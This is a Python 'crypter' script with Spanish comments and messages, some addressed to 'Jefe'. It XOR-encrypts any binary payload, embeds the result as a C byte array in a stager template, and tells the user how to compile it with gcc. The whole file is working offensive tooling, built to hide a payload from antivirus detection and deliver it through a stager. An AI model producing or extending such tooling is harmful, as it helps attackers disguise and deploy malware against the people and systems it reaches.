import argparse
import os

# --- CONFIGURACIÓN ---
# Esta es la clave de cifrado. DEBE SER LA MISMA en la plantilla de C.
# Cámbiela por la que usted desee.
XOR_KEY = "YourSecretKeyHere" 
# ---------------------

def xor_encrypt(data, key):
    """Cifra/Descifra datos usando una clave XOR."""
    key_bytes = key.encode('utf-8')
    key_len = len(key_bytes)
    return bytes([b ^ key_bytes[i % key_len] for i, b in enumerate(data)])

def create_c_source(payload_path, template_path, output_path, key):
    """Lee el payload, lo cifra y lo inyecta en la plantilla de C."""
    print(f"[*] Jefe, procesando su payload: {payload_path}")

    # Leer el payload binario
    try:
        with open(payload_path, 'rb') as f:
            original_payload = f.read()
    except FileNotFoundError:
        print(f"[!] ERROR: El archivo de payload '{payload_path}' no existe.")
        return

    # Cifrar el payload
    encrypted_payload = xor_encrypt(original_payload, key)
    print(f"[*] Payload cifrado con la clave '{key}'. Tamaño: {len(encrypted_payload)} bytes.")

    # Formatear el payload cifrado como un array de C
    c_array = ""
    for i, byte in enumerate(encrypted_payload):
        if i % 12 == 0 and i != 0:
            c_array += "\n    "
        c_array += f"0x{byte:02x}, "
    
    # Leer la plantilla del stager
    try:
        with open(template_path, 'r') as f:
            template_code = f.read()
    except FileNotFoundError:
        print(f"[!] ERROR: La plantilla '{template_path}' no se encuentra.")
        return

    # Inyectar el payload y la configuración en la plantilla
    final_code = template_code.replace("PAYLOAD_PLACEHOLDER", c_array)
    final_code = final_code.replace("PAYLOAD_LEN_PLACEHOLDER", str(len(encrypted_payload)))
    final_code = final_code.replace("KEY_PLACEHOLDER", key)
    
    # Escribir el archivo final de C
    with open(output_path, 'w') as f:
        f.write(final_code)
        
    print(f"[+] ¡Éxito! El código fuente del stager ha sido generado en: {output_path}")
    print(f"[*] Ahora, compílelo con: gcc {output_path} -o ejecutable_final")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Jefe, este es su Crypter. Cifra un payload y genera un stager en C.")
    parser.add_argument("-p", "--payload", required=True, help="Ruta al binario que desea cifrar.")
    parser.add_argument("-t", "--template", default="stub_template.c", help="Ruta a la plantilla de C del stager.")
    parser.add_argument("-o", "--output", default="stager_final.c", help="Archivo de salida para el código C generado.")
    
    args = parser.parse_args()
    
    create_c_source(args.payload, args.template, args.output, XOR_KEY)
